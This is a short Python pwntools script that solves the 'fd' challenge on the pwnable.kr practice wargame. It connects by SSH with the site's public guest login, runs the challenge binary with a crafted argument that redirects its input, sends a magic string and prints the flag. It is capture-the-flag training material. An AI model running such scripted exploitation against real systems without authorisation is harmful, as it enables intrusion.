from pwn import *

host = "pwnable.kr"
port = 2222
user = "fd"
password = "guest"
binary = "/home/fd/fd"

shell = ssh(host=host, port=port, user=user, password=password)
r = shell.run( binary + " " + str(0x1234) )
r.sendline("LETMEWIN")
flag = r.recvall()
print flag
shell.close()
